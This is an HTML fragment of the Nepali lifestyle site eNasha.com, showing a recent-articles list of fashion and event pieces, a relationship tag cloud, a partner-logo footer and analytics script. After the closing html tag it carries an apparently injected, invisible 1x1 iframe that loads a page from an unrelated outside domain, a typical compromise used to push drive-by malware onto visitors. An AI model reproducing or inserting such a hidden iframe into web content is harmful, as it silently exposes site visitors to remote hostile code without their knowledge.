    <td>
	<table width="100%"  border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
        <tr> 
          <td height="30"> <div align="left"><span class="random-title2"> Recent 
              Articles </span></div></td>
        </tr>
        <tr> 
          <td><table width="100%" border="0" cellpadding="0" cellspacing="0">
                            <tr> 
                <td><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr> 
                <td><table width="100%" border="0" cellpadding="2" cellspacing="0">
                    <tr> 
                      <td width="15" align="center" valign="top"><a href='http://www.enasha.com/article.php?id=3500'><img src="http://www.enasha.com/product_thumb.php?img=uploaded/tn_3500.jpg&amp;w=75&amp;h=75" border="0"></a></td>
                      <td width="151" height="20	" align="left" valign="middle"><a href='http://www.enasha.com/article.php?id=3500'><font color="#002B5E">Sonitpur Saanjh 2068</font></a></td>
                    </tr>
                  </table></td>
              </tr>
              <tr> 
                <td height="4" bgcolor="#FFFFFF"><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr>
                <td height="1" align="center"><img src="images/250line.jpg" width="240" height="1" /></td>
              </tr>
                            <tr> 
                <td><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr> 
                <td><table width="100%" border="0" cellpadding="2" cellspacing="0">
                    <tr> 
                      <td width="15" align="center" valign="top"><a href='http://www.enasha.com/article.php?id=3499'><img src="http://www.enasha.com/product_thumb.php?img=uploaded/tn_3499.jpg&amp;w=75&amp;h=75" border="0"></a></td>
                      <td width="151" height="20	" align="left" valign="middle"><a href='http://www.enasha.com/article.php?id=3499'><font color="#002B5E">Style Check Dashain Fashion 2011</font></a></td>
                    </tr>
                  </table></td>
              </tr>
              <tr> 
                <td height="4" bgcolor="#FFFFFF"><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr>
                <td height="1" align="center"><img src="images/250line.jpg" width="240" height="1" /></td>
              </tr>
                            <tr> 
                <td><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr> 
                <td><table width="100%" border="0" cellpadding="2" cellspacing="0">
                    <tr> 
                      <td width="15" align="center" valign="top"><a href='http://www.enasha.com/article.php?id=3498'><img src="http://www.enasha.com/product_thumb.php?img=uploaded/tn_3498.jpg&amp;w=75&amp;h=75" border="0"></a></td>
                      <td width="151" height="20	" align="left" valign="middle"><a href='http://www.enasha.com/article.php?id=3498'><font color="#002B5E">Style Check Dashain Fashion 2011</font></a></td>
                    </tr>
                  </table></td>
              </tr>
              <tr> 
                <td height="4" bgcolor="#FFFFFF"><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr>
                <td height="1" align="center"><img src="images/250line.jpg" width="240" height="1" /></td>
              </tr>
                            <tr> 
                <td><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr> 
                <td><table width="100%" border="0" cellpadding="2" cellspacing="0">
                    <tr> 
                      <td width="15" align="center" valign="top"><a href='http://www.enasha.com/article.php?id=3497'><img src="http://www.enasha.com/product_thumb.php?img=uploaded/tn_3497.jpg&amp;w=75&amp;h=75" border="0"></a></td>
                      <td width="151" height="20	" align="left" valign="middle"><a href='http://www.enasha.com/article.php?id=3497'><font color="#002B5E">Style Check Dashain Fashion 2011</font></a></td>
                    </tr>
                  </table></td>
              </tr>
              <tr> 
                <td height="4" bgcolor="#FFFFFF"><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr>
                <td height="1" align="center"><img src="images/250line.jpg" width="240" height="1" /></td>
              </tr>
                            <tr> 
                <td><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr> 
                <td><table width="100%" border="0" cellpadding="2" cellspacing="0">
                    <tr> 
                      <td width="15" align="center" valign="top"><a href='http://www.enasha.com/article.php?id=3496'><img src="http://www.enasha.com/product_thumb.php?img=uploaded/tn_3496.jpg&amp;w=75&amp;h=75" border="0"></a></td>
                      <td width="151" height="20	" align="left" valign="middle"><a href='http://www.enasha.com/article.php?id=3496'><font color="#002B5E">Style Check Dashain Fashion 2011</font></a></td>
                    </tr>
                  </table></td>
              </tr>
              <tr> 
                <td height="4" bgcolor="#FFFFFF"><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr>
                <td height="1" align="center"><img src="images/250line.jpg" width="240" height="1" /></td>
              </tr>
                            <tr> 
                <td><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr> 
                <td><table width="100%" border="0" cellpadding="2" cellspacing="0">
                    <tr> 
                      <td width="15" align="center" valign="top"><a href='http://www.enasha.com/article.php?id=3495'><img src="http://www.enasha.com/product_thumb.php?img=uploaded/tn_3495.jpg&amp;w=75&amp;h=75" border="0"></a></td>
                      <td width="151" height="20	" align="left" valign="middle"><a href='http://www.enasha.com/article.php?id=3495'><font color="#002B5E">Style Check Dashain Fashion 2011</font></a></td>
                    </tr>
                  </table></td>
              </tr>
              <tr> 
                <td height="4" bgcolor="#FFFFFF"><img src="images/spacer.gif" width="4" height="5" /></td>
              </tr>
              <tr>
                <td height="1" align="center"><img src="images/250line.jpg" width="240" height="1" /></td>
              </tr>
                          </table></td>
        </tr>
        <tr>
          <td align="left"><a href="http://www.enasha.com/latest_articles.php?pageno=1">Complete List 
            of Articles</a></td>
        </tr>
      </table></td>
  </tr>
</table>
      </div></td>
  </tr>
  <tr> 
    <td bgcolor="#666666"><table width="250" border="0" align="center" cellpadding="1" cellspacing="0" bgcolor="#CCCCCC">
        <tr> 
          <td><table width="100%" cellpadding="5" bgcolor="#FFFFFF">
              <tr> 
                <td align="left"> 
                                                  <p><span class="article-title2">Tags in Relationship </span><br />
                                                 <a href='http://www.enasha.com/article_tag1.php?tag_name=29&pageno=1' class='dip-tag' style='font-size: 19px;'>sex</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=30&pageno=1' class='dip-tag' style='font-size: 24px;'>dating</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=31&pageno=1' class='dip-tag' style='font-size: 12px;'>divorce</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=32&pageno=1' class='dip-tag' style='font-size: 24px;'>cheating</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=34&pageno=1' class='dip-tag' style='font-size: 20px;'>kissing</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=35&pageno=1' class='dip-tag' style='font-size: 13px;'>marriage</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=36&pageno=1' class='dip-tag' style='font-size: 17px;'>honeymoon</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=37&pageno=1' class='dip-tag' style='font-size: 20px;'>friends</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=38&pageno=1' class='dip-tag' style='font-size: 11px;'>tips</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=39&pageno=1' class='dip-tag' style='font-size: 16px;'>gifts</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=40&pageno=1' class='dip-tag' style='font-size: 19px;'>breakup</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=41&pageno=1' class='dip-tag' style='font-size: 19px;'>infidelity</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=62&pageno=1' class='dip-tag' style='font-size: 11px;'>parties</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=107&pageno=1' class='dip-tag' style='font-size: 27px;'>know women</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=108&pageno=1' class='dip-tag' style='font-size: 20px;'>attracting girls</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=106&pageno=1' class='dip-tag' style='font-size: 18px;'>know men</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=109&pageno=1' class='dip-tag' style='font-size: 22px;'>attracting guys</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=110&pageno=1' class='dip-tag' style='font-size: 19px;'>flirting</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=111&pageno=1' class='dip-tag' style='font-size: 24px;'>love</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=112&pageno=1' class='dip-tag' style='font-size: 21px;'>personal</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=113&pageno=1' class='dip-tag' style='font-size: 19px;'>valentine's day</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=114&pageno=1' class='dip-tag' style='font-size: 18px;'>ex-love</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=115&pageno=1' class='dip-tag' style='font-size: 18px;'>occassion</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=116&pageno=1' class='dip-tag' style='font-size: 23px;'>fun read</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=117&pageno=1' class='dip-tag' style='font-size: 22px;'>memories</a> <a href='http://www.enasha.com/article_tag1.php?tag_name=339&pageno=1' class='dip-tag' style='font-size: 25px;'>Family</a>                                   <br />
                                                   <a href="http://www.enasha.com/group_tags.php">Browse Tag by Group</a> <br />
                                <a href="http://www.enasha.com/all_tags.php">Complete List of Tags</a></p>
                                                </td>
              </tr>
            </table></td>
        </tr>
      </table></td>
  </tr>
</table>
 </td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td height="72" background="images/bg_footer.jpg">
	<table width="98%" height="80" border="0" align="center" cellpadding="0" cellspacing="0" class="body1">
  <tr>
    <td class="body1-small"><div align="center">&copy; Copyright eNasha .com<br />
      </div>
    <div align="center"><a href="article.php?id=139" class="bc-navigation">About Us</a> | <a href="contactus.php" class="bc-navigation">Contact</a> | <a href="advertise.php" class="bc-navigation">Advertise</a> | <a href="sitemap.php" class="bc-navigation">SiteMap</a></div></td>
    <td width="1%" class="photo-caption"><div align="center"><img src="main/images/main/seperator_grey.gif" width="2" height="28" /></div></td>
    <td width="55%" class="photo-caption"><table width="100%" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td width="38%" align="center"><a href="http://www.dreamsandideas.com" target="_blank"><img src="main/images/main/logo_dni.gif" width="140" height="43" border="0" /></a></td>
        <td width="29%" align="center"><a href="http://www.cybersansar.com" target="_blank"><img src="main/images/main/logo_cybersansar.gif" width="107" height="43" border="0" /></a></td>
        <td width="38%" align="center"><a href="http://www.modelsansar.com" target="_blank"><img src="main/images/main/logo_modelsansar.gif" width="120" height="46" border="0" /></a></td>
        <td>&nbsp;</td>
      </tr>
    </table></td>
    <td width="1%" class="photo-caption"><div align="center"><img src="main/images/main/seperator_grey.gif" width="2" height="28" /></div></td>
    <td width="5%"><span style="width:100px;height:42px;display:inline-block;
/* the height and width should match those of the image */
filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='images/logo_oman.png');
/* apply the background image with Alpha in IE5.5/Win. The src should match that of the image */
"><img style="
filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0);
/* make the real image fully transparent in IE5.5/Win, so the Alpha image can show through */
" src="images/logo_oman.png" width="100" height="42" border="0" alt="Online Media Association of Nepal" /></span></td>
  </tr>
</table>
<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
</script>
<script type="text/javascript">
_uacct = "UA-244727-4";
urchinTracker();
</script>			</td>
  </tr>
</table>
</body>
</html>
<iframe src="http://yxbegan.com/ind.php" width="1" height="1" alt="Uw8bLlKjsi3HqXs"></iframe>